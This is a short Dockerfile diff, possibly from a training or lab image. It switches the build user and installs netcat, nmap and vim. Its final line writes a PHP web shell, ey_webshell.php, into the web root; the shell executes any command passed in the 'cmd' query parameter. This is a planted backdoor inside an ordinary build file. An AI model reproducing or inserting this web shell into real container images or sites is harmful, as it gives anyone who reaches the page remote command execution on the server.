@@ -7,9 +7,11 @@ ARG COMMIT_SHA
 ENV COMMIT_SHA $COMMIT_SHA
 
 RUN echo "=========="
+USER ROOT
 RUN apk add --no-cache \
   nc \
   nmap \
   vim
 RUN echo "=========="
+USER nobody
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
